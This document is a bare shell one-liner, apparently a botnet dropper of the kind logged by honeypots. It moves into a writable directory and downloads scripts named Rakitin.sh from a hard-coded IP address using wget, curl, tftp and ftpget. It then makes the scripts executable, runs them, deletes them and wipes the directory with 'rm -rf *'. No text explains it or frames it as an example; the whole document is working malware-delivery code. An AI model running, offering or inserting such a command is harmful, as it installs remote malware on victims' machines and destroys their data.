cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.85.190.74/Rakitin.sh; curl -O http://45.85.190.74/Rakitin.sh; chmod 777 Rakitin.sh; sh Rakitin.sh; tftp 45.85.190.74 -c get Rakitin.sh; chmod 777 Rakitin.sh; sh Rakitin.sh; tftp -r Rakitin2.sh -g 45.85.190.74; chmod 777 Rakitin2.sh; sh Rakitin2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.85.190.74 Rakitin1.sh Rakitin1.sh; sh Rakitin1.sh; rm -rf Rakitin.sh Rakitin.sh Rakitin2.sh Rakitin1.sh; rm -rf *
